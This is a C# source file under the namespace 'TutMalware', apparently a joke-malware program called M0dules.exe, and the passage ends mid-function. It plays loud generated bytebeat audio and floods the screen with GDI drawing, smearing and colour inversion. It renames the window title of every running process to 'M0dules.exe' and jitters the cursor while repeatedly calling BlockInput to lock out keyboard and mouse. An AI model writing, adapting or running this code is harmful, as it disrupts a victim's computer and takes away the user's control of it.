// TutMalware.Program
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using m0dules;
using Microsoft.Win32;

internal static class Program
{
	private class bb1 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 8000;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 30;

				var data = new byte[sample_rate * seconds];

				for (var t = 4; t < data.Length; t++)
					data[t] = (byte)(
						t >> (t >> 7) + t * ((t >> 8 & 3))
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}
		}
	}
	private class bb2 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 8000;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 30;

				var data = new byte[sample_rate * seconds];

				for (var t = 4; t < data.Length; t++)
					data[t] = (byte)(
						t * t >> (t >> 16 | t >> 8) | (t >> 9 | t >> 4) * t
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}
		}
	}
	private class bb3 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 8000;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 30;

				var data = new byte[sample_rate * seconds];

				for (var t = 4; t < data.Length; t++)
					data[t] = (byte)(
						t>>t
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}
		}
	}
	private class bb4 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 8000;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 30;

				var data = new byte[sample_rate * seconds];

				for (var t = 4; t < data.Length; t++)
					data[t] = (byte)(
						t * (1 + (t >> 9 & t >> 6)) & t + t
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}
		}
	}
	#region rgb to hsl
	public struct RGB
	{
		private byte _r;
		private byte _g;
		private byte _b;

		public RGB(byte r, byte g, byte b)
		{
			this._r = r;
			this._g = g;
			this._b = b;
		}

		public byte R
		{
			get { return this._r; }
			set { this._r = value; }
		}

		public byte G
		{
			get { return this._g; }
			set { this._g = value; }
		}

		public byte B
		{
			get { return this._b; }
			set { this._b = value; }
		}

		public bool Equals(RGB rgb)
		{
			return (this.R == rgb.R) && (this.G == rgb.G) && (this.B == rgb.B);
		}
	}

	public struct HSL
	{
		private int _h;
		private float _s;
		private float _l;

		public HSL(int h, float s, float l)
		{
			this._h = h;
			this._s = s;
			this._l = l;
		}

		public int H
		{
			get { return this._h; }
			set { this._h = value; }
		}

		public float S
		{
			get { return this._s; }
			set { this._s = value; }
		}

		public float L
		{
			get { return this._l; }
			set { this._l = value; }
		}

		public bool Equals(HSL hsl)
		{
			return (this.H == hsl.H) && (this.S == hsl.S) && (this.L == hsl.L);
		}
	}

	public static RGB HSLToRGB(HSL hsl)
	{
		byte r = 0;
		byte g = 0;
		byte b = 0;

		if (hsl.S == 0)
		{
			r = g = b = (byte)(hsl.L * 255);
		}
		else
		{
			float v1, v2;
			float hue = (float)hsl.H / 360;

			v2 = (hsl.L < 0.5) ? (hsl.L * (1 + hsl.S)) : ((hsl.L + hsl.S) - (hsl.L * hsl.S));
			v1 = 2 * hsl.L - v2;

			r = (byte)(255 * HueToRGB(v1, v2, hue + (1.0f / 3)));
			g = (byte)(255 * HueToRGB(v1, v2, hue));
			b = (byte)(255 * HueToRGB(v1, v2, hue - (1.0f / 3)));
		}

		return new RGB(r, g, b);
	}

	private static float HueToRGB(float v1, float v2, float vH)
	{
		if (vH < 0)
			vH += 1;

		if (vH > 1)
			vH -= 1;

		if ((6 * vH) < 1)
			return (v1 + (v2 - v1) * 6 * vH);

		if ((2 * vH) < 1)
			return v2;

		if ((3 * vH) < 2)
			return (v1 + (v2 - v1) * ((2.0f / 3) - vH) * 6);

		return v1;
	}
	#endregion

	private class Drawer1 : Drawer
	{
		private int redrawCounter;
		private int cc;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				int ccs = cc;
				Graphics g = Graphics.FromHdc(hdc);
				HSL data = new HSL(ccs, 1f, 0.5f);
				RGB value = HSLToRGB(data);
				Pen pen = new Pen(Color.FromArgb(255, value.R, value.G, value.B), 50);
				Pen t = new Pen(Color.FromArgb(random.Next(0, 255), random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)),random.Next(0,255));
				t.EndCap = System.Drawing.Drawing2D.LineCap.ArrowAnchor;
				t.StartCap = System.Drawing.Drawing2D.LineCap.RoundAnchor;
				pen.LineJoin = System.Drawing.Drawing2D.LineJoin.Bevel;
				pen.EndCap = System.Drawing.Drawing2D.LineCap.ArrowAnchor;
				pen.StartCap = System.Drawing.Drawing2D.LineCap.RoundAnchor;
				int curx = Cursor.Position.X;
				int cury = Cursor.Position.Y;
				g.DrawLine(pen, screenW/2, screenH/2, curx, cury);
				g.DrawLine(t, screenW / 2, screenH / 2, random.Next(0,screenW), random.Next(0,screenH));
				cc++;
				redrawCounter++;
				if (redrawCounter >= 5) 
				{
					Redraw();
					redrawCounter = 0;
				}
				if(cc >= 360) { cc = 0; }
			}
            catch { }
		}
	}

	private class Drawer2 : Drawer
	{
		private int redrawCounter;
		private int rd;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				int ccs = redrawCounter;
				int ccs1 = rd;
				redrawCounter++;
				rd += 2;
				HSL data = new HSL(ccs, 1f, 0.5f);
				RGB value = HSLToRGB(data);
				HSL data1 = new HSL(ccs1, 1f, 0.5f);
				RGB value1 = HSLToRGB(data1);
				Graphics g = Graphics.FromHdc(hdc);
				HatchBrush hbrush = new HatchBrush(HatchStyle.Sphere, Color.FromArgb(255, value.R, value.G, value.B), Color.FromArgb(255, value1.R, value1.G, value1.B));
				g.DrawString("M0dules.exe", new Font(FontFamily.GenericSerif, random.Next(0, 255)), hbrush, random.Next(-screenW, screenW+screenW), random.Next(-screenH, screenH+screenH));

				if (redrawCounter >= 360)
                {
					redrawCounter = 0;
                }
				if (rd >= 360)
				{
					rd = 0;
				}
			}
            catch { }
			Thread.Sleep(0);
		}
	}

	private class Drawer3 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics g = Graphics.FromHdc(hdc);
				HatchBrush hbrush = new HatchBrush(HatchStyle.Plaid, Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)), Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
				g.FillRectangle(hbrush, random.Next(0, screenW), random.Next(0, screenH), random.Next(0, screenW), random.Next(0, screenH));
				Thread.Sleep(10);
				BitBlt(hdc, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), hdc, random.Next(screenW), random.Next(screenH), 3342344);
				Thread.Sleep(10);
			}
            catch { }
		}
	}

	private class Drawer4 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics g = Graphics.FromHdc(hdc);
				HatchBrush hbrush = new HatchBrush(HatchStyle.Plaid, Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)), Color.FromArgb(0, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
				g.FillRectangle(hbrush, 0, 0, screenW, screenH);
				Thread.Sleep(5000);
			}
            catch { }
		}
	}
	
	private class Drawer5 : Drawer
	{
		private static Random random = new Random();
		private int redrawCounter;
		private int codcod;
		private int ballWidth = 100;
		private int ballHeight = 100;
		private int ballPosX = Cursor.Position.X;
		private int ballPosY = Cursor.Position.Y;
		private int moveStepX = 10;
		private int moveStepY = 10;
		private static SolidBrush hbrush = new SolidBrush(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));

        public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics g = Graphics.FromHdc(hdc);
				Random r = new Random();
				int x = screenW;
				int y = screenH;
				
				g.FillRectangle(hbrush,ballPosX,ballPosY,ballWidth,ballHeight);
				ballPosX += moveStepX;
				if (
					ballPosX < 0 ||
					ballPosX + ballWidth > screenW
					)
				{
					moveStepX = -moveStepX;
					hbrush = new SolidBrush(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
				}

				ballPosY += moveStepY;
				if (
					ballPosY < 0 ||
					ballPosY + ballHeight > screenH
					)
				{
					moveStepY = -moveStepY;
					hbrush = new SolidBrush(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
				}
				if (redrawCounter >= 360) { redrawCounter = 0; }
				if (codcod >= 360) { codcod = 0; }
			}
			catch { }
			Thread.Sleep(5);
		}
	}

	private class Drawer6 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics g = Graphics.FromHdc(hdc);
				SolidBrush sbrush = new SolidBrush(Color.Black);
				HatchBrush hbrush1 = new HatchBrush(HatchStyle.Percent90, Color.Black, Color.Transparent);
				HatchBrush hbrush2 = new HatchBrush(HatchStyle.Percent80, Color.Black, Color.Transparent);
				HatchBrush hbrush3 = new HatchBrush(HatchStyle.Percent75, Color.Black, Color.Transparent);
				HatchBrush hbrush4 = new HatchBrush(HatchStyle.Percent70, Color.Black, Color.Transparent);
				HatchBrush hbrush5 = new HatchBrush(HatchStyle.Percent60, Color.Black, Color.Transparent);
				HatchBrush hbrush6 = new HatchBrush(HatchStyle.Percent50, Color.Black, Color.Transparent);
				HatchBrush hbrush7 = new HatchBrush(HatchStyle.Percent40, Color.Black, Color.Transparent);
				HatchBrush hbrush8 = new HatchBrush(HatchStyle.Percent30, Color.Black, Color.Transparent);
				HatchBrush hbrush9 = new HatchBrush(HatchStyle.Percent25, Color.Black, Color.Transparent);
				HatchBrush hbrush10 = new HatchBrush(HatchStyle.Percent20, Color.Black, Color.Transparent);
				HatchBrush hbrush11 = new HatchBrush(HatchStyle.Percent10, Color.Black, Color.Transparent);
				HatchBrush hbrush12 = new HatchBrush(HatchStyle.Percent05, Color.Black, Color.Transparent);
				g.FillRectangle(sbrush, 0, 0, screenW, 100);
				g.FillRectangle(hbrush1, 0, 100, screenW, 100);
				g.FillRectangle(hbrush2, 0, 200, screenW, 100);
				g.FillRectangle(hbrush3, 0, 300, screenW, 100);
				g.FillRectangle(hbrush4, 0, 400, screenW, 100);
				g.FillRectangle(hbrush5, 0, 500, screenW, 100);
				g.FillRectangle(hbrush6, 0, 600, screenW, 100);
				g.FillRectangle(hbrush7, 0, 700, screenW, 100);
				g.FillRectangle(hbrush8, 0, 800, screenW, 100);
				g.FillRectangle(hbrush9, 0, 900, screenW, 100);
				g.FillRectangle(hbrush10, 0, 1000, screenW, 100);
				g.FillRectangle(hbrush11, 0, 1100, screenW, 100);
				g.FillRectangle(hbrush12, 0, 1200, screenW, 100);
            }
            catch { }
			Thread.Sleep(1000);
		}
	}
	private class Drawer7 : Drawer
	{

		private static Random random = new Random();
		private int redrawCounter;
		private int codcod;
		private int ballWidth = 200;
		private int ballHeight = 30;
		private int ballPosX = random.Next(0, Screen.PrimaryScreen.Bounds.Width - 300);
		private int ballPosY = random.Next(0, Screen.PrimaryScreen.Bounds.Height - 50);
		private int moveStepX = 10;
		private int moveStepY = 10;
		private static SolidBrush sbrush2 = new SolidBrush(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));

		public override void Draw(IntPtr hdc)
		{
			try
			{
				int ccs = redrawCounter;
				Graphics g = Graphics.FromHdc(hdc);
				HSL data = new HSL(ccs, 1f, 0.5f);
				RGB value = HSLToRGB(data);
				Random r = new Random();
				int x = screenW;
				int y = screenH;
				SolidBrush sbrush1 = new SolidBrush(Color.FromArgb(255, value.R, value.G, value.B));
				g.DrawString("M0dules.exe", new Font(FontFamily.GenericSansSerif, 25), sbrush1, ballPosX, ballPosY);
				g.DrawString("M0dules.exe", new Font(FontFamily.GenericSansSerif, random.Next(0,100)), sbrush1, random.Next(-screenW,screenW+screenW), random.Next(-screenH, screenH + screenH));
				redrawCounter++;
				ballPosX += moveStepX;
				if (
					ballPosX < 0 ||
					ballPosX + ballWidth > screenW
					)
				{
					moveStepX = -moveStepX;
				}

				ballPosY += moveStepY;
				if (
					ballPosY < 0 ||
					ballPosY + ballHeight > screenH
					)
				{
					moveStepY = -moveStepY;

				}
				if (redrawCounter >= 360) { redrawCounter = 0; }
				if (codcod >= 360) { codcod = 0; }
			}
			catch { }
			Thread.Sleep(0);
		}
	}
	[DllImport("gdi32.dll")]
	static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
int yMask);
	public struct POINT
	{
		public int X;
		public int Y;

		public POINT(int x, int y)
		{
			this.X = x;
			this.Y = y;
		}

		public static implicit operator System.Drawing.Point(POINT p)
		{
			return new System.Drawing.Point(p.X, p.Y);
		}

		public static implicit operator POINT(System.Drawing.Point p)
		{
			return new POINT(p.X, p.Y);
		}

	}
	private class Drawer8 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			int x = Screen.PrimaryScreen.Bounds.X;
			int y = Screen.PrimaryScreen.Bounds.Y;
			int left = Screen.PrimaryScreen.Bounds.Left;
			int top = Screen.PrimaryScreen.Bounds.Top;
			int right = Screen.PrimaryScreen.Bounds.Right;
			int bottom = Screen.PrimaryScreen.Bounds.Bottom;
			POINT[] lppoint = new POINT[3];
			lppoint[0].X = left - (100);
			lppoint[0].Y = top + (100);
			lppoint[1].X = right - (100);
			lppoint[1].Y = top + (0);
			lppoint[2].X = left - (0);
			lppoint[2].Y = bottom - (0);
			PlgBlt(hdc, lppoint, hdc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
			Thread.Sleep(0);
		}
	}
	public static Bitmap ChangeOpacity(Image img, float opacityvalue)
	{
		Bitmap bmp = new Bitmap(img.Width, img.Height); // Determining Width and Height of Source Image
		Graphics graphics = Graphics.FromImage(bmp);
		ColorMatrix colormatrix = new ColorMatrix();
		colormatrix.Matrix33 = opacityvalue;
		ImageAttributes imgAttribute = new ImageAttributes();
		imgAttribute.SetColorMatrix(colormatrix, ColorMatrixFlag.Default, ColorAdjustType.Bitmap);
		graphics.DrawImage(img, new Rectangle(0, 0, bmp.Width, bmp.Height), 0, 0, img.Width, img.Height, GraphicsUnit.Pixel, imgAttribute);
		graphics.Dispose();   // Releasing all resource used by graphics 
		return bmp;
	}
	private class Drawer9 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				int screenW = Screen.PrimaryScreen.Bounds.Width;

				int screenH = Screen.PrimaryScreen.Bounds.Height;
				Graphics g = Graphics.FromHdc(hdc);
				var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
									   Screen.PrimaryScreen.Bounds.Height,
									   PixelFormat.Format32bppArgb);

				// Create a graphics object from the bitmap.
				var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

				// Take the screenshot from the upper left corner to the right bottom corner.
				gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
											Screen.PrimaryScreen.Bounds.Y,
											0,
											0,
											Screen.PrimaryScreen.Bounds.Size,
											CopyPixelOperation.SourceCopy);
				Bitmap tbmp = ChangeOpacity(bmpScreenshot, 0.2F);
				g.DrawImage(tbmp, -50, -50, screenW + 100, screenH + 100);
			}
            catch { }
			Thread.Sleep(0);
		}
	}

	private class Drawer10 : Drawer
	{
		private int redrawCounter;
		private int cc;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				int ccs = cc;
				Graphics g = Graphics.FromHdc(hdc);
				HSL data = new HSL(ccs, 1f, 0.5f);
				RGB value = HSLToRGB(data);
				Pen pen = new Pen(Color.FromArgb(255, value.R, value.G, value.B), 50);
				Pen t = new Pen(Color.FromArgb(random.Next(0, 255), random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)), random.Next(0, 255));
				pen.LineJoin = System.Drawing.Drawing2D.LineJoin.Bevel;
				pen.EndCap = System.Drawing.Drawing2D.LineCap.ArrowAnchor;
				pen.StartCap = System.Drawing.Drawing2D.LineCap.Round;
				int curx = Cursor.Position.X;
				int cury = Cursor.Position.Y;
				g.DrawLine(pen, screenW, cury, curx, cury);
				g.DrawLine(pen, 0, cury, curx, cury);
				g.DrawLine(pen, curx, screenH, curx, cury);
				g.DrawLine(pen, curx, 0, curx, cury);
				g.DrawLine(pen, screenW, screenH, curx, cury);
				g.DrawLine(pen, 0, 0, curx, cury);
				g.DrawLine(pen, screenW, 0, curx, cury);
				g.DrawLine(pen, 0, screenH, curx, cury);
				cc++;
				redrawCounter++;
				if (redrawCounter >= 5)
				{
					Redraw();
					redrawCounter = 0;
				}
				if (cc >= 360) { cc = 0; }
			}
			catch { }
		}
	}

	private class Drawer11 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			int r1 = random.Next(-screenW, screenW + screenW);
			int r2 = random.Next(-screenH, screenH + screenH);
			int r3 = random.Next(-screenW, screenW + screenW);
			int r4 = random.Next(-screenH, screenH + screenH);
			BitBlt(hdc, r1, r2, r3, r4, hdc, r1+random.Next(-1,2), r2 + random.Next(-1, 2), 13369376);
			Thread.Sleep(0);
		}
	}
	private class Drawer12 : Drawer
	{
		private int pl;
		private int ext;
		public override void Draw(IntPtr hdc)
		{
			int plo = pl;
			int str = ext;
			int num = 10;
			int num2 = 100;
			int num3 = random.Next(0, screenW - num);
			int num4 = random.Next(0, screenH - num2);
			//BitBlt(hdc, 0, 0 + plo, screenW, 1 + plo, hdc, 5 + str, 0 + plo, 13369376);
			//BitBlt(hdc, 0, 1 + plo, screenW, 1 + plo, hdc, -5 - str, 1 + plo, 13369376);
			BitBlt(hdc, 0, 0 + plo * 2, screenW, 1 + plo, hdc, 50, 0 + plo * 2, 13369376);
			BitBlt(hdc, 0, 1 + plo * 2, screenW, 1 + plo, hdc, -50, 1 + plo * 2, 13369376);
			pl += 1;
			if (pl >= screenH) { pl = 0; ext += 25; }
			if (ext >= screenW / 5) { ext = 0; RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); }
		}
	}

	[DllImport("user32.dll")]
	static extern bool SetWindowText(IntPtr hWnd, string text);
	private class Windowtext : Drawer
	{
		private int redrawCounter;
		//hi if you use a decompiler: hi
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Process myProcess = new Process();
				Process[] processes = Process.GetProcesses();

				foreach (var process in processes)
				{

					Console.WriteLine("Process Name: {0} ", process.ProcessName);

					IntPtr handle = process.MainWindowHandle;
					if (handle != IntPtr.Zero)
					{

						SetWindowText(process.MainWindowHandle, "M0dules.exe");
						Thread.Sleep(100);
						//
					}
				}
			}
			catch { }

		}
	}
	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
	private class Cur : Drawer
	{
		private int redrawCounter;
		//hi if you use a decompiler: hi
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Cursor.Position = new Point(Cursor.Position.X + random.Next(-1,2), Cursor.Position.Y + random.Next(-1, 2));
				BlockInput(fBlockIt:true);
			}
			catch { }

		}
	}
	private abstract class Drawer
	{
		public bool running;

		public Random random = new Random();

		public int screenW = Screen.PrimaryScreen.Bounds.Width;

		public int screenH = Screen.PrimaryScreen.Bounds.Height;

		public void Start()
		{
			if (!running)
			{
				running = true;
				new Thread(DrawLoop).Start();
			}
		}

		public void Stop()
		{
			running = false;
		}

		private void DrawLoop()
		{
			while (running)
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				Draw(dC);
				ReleaseDC(IntPtr.Zero, dC);
			}
		}

		public void Redraw()
		{
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
		}

		public abstract void Draw(IntPtr hdc);
	}

	[Flags]
	private enum RedrawWindowFlags : uint
	{
		Invalidate = 1u,
		InternalPaint = 2u,
		Erase = 4u,
		Validate = 8u,
		NoInternalPaint = 0x10u,
		NoErase = 0x20u,
		NoChildren = 0x40u,
		AllChildren = 0x80u,
		UpdateNow = 0x100u,
		EraseNow = 0x200u,
		Frame = 0x400u,
		NoFrame = 0x800u
	}
	private static void slow1(IntPtr hdc) 
	{
		int screenW = Screen.PrimaryScreen.Bounds.Width;

		int screenH = Screen.PrimaryScreen.Bounds.Height;
		Graphics g = Graphics.FromHdc(hdc);
		var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
							   Screen.PrimaryScreen.Bounds.Height,
							   PixelFormat.Format32bppArgb);

		// Create a graphics object from the bitmap.
		var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

		// Take the screenshot from the upper left corner to the right bottom corner.
		gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
									Screen.PrimaryScreen.Bounds.Y,
									0,
									0,
									Screen.PrimaryScreen.Bounds.Size,
									CopyPixelOperation.SourceCopy);
		Bitmap temp = (Bitmap)bmpScreenshot;
		Bitmap bmap = (Bitmap)temp.Clone();
		Color c;
		for (int i = 0; i < bmap.Width; i++)
		{
			for (int j = 0; j < bmap.Height; j++)
			{
				c = bmap.GetPixel(i, j);
				bmap.SetPixel(i, j,
  Color.FromArgb(255 - c.R, 255 - c.G, 255 - c.B));
			}
		}
		bmpScreenshot = (Bitmap)bmap.Clone();
		for (int i = 0; i < screenW; i += 100)
		{
			g.DrawImage(temp, -i, 0);
			g.DrawImage(bmap, screenW - i, 0);
			Thread.Sleep(100);
		}
	}
	public static void by1()
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = 60;

			var data = new byte[sample_rate * seconds];

			for (var t = 4; t < data.Length; t++)
				data[t] = (byte)(
					t * (1 + (t >> 9 & t >> 6)) & t + t
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}
	public static void by2()
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = 30;

			var data = new byte[sample_rate * seconds];

			for (var t = 4; t < data.Length; t++)
				data[t] = (byte)(
					t ^ t * ((t + 0xdeaddead & t) >> 5)
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

			foreach (var elt in data) writer.Write(elt);

			writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
			writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

			stream.Seek(0, SeekOrigin.Begin);

			new SoundPlayer(stream).PlaySync();
		}
	}
	public static void by3()
	{
		using (var stream = new MemoryStream())
		{
			var writer = new BinaryWriter(stream);

			writer.Write("RIFF".ToCharArray());  // chunk id
			writer.Write((UInt32)0);             // chunk size
			writer.Write("WAVE".ToCharArray());  // format

			writer.Write("fmt ".ToCharArray());  // chunk id
			writer.Write((UInt32)16);            // chunk size
			writer.Write((UInt16)1);             // audio format

			var channels = 1;
			var sample_rate = 8000;
			var bits_per_sample = 8;

			writer.Write((UInt16)channels);
			writer.Write((UInt32)sample_rate);
			writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
			writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
			writer.Write((UInt16)bits_per_sample);

			writer.Write("data".ToCharArray());

			var seconds = 30;

			var data = new byte[sample_rate * seconds];

			for (var t = 4; t < data.Length; t++)
				data[t] = (byte)(
					-t * (0xdeaddead >> (-t >> 9 & 5) & 20) | t >> 6 * (t >> 8)
					//t * (42 & t >> 10)
					//t | t % 255 | t % 257
					//t * (t >> 9 | t >> 13) & 16
					);

			writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

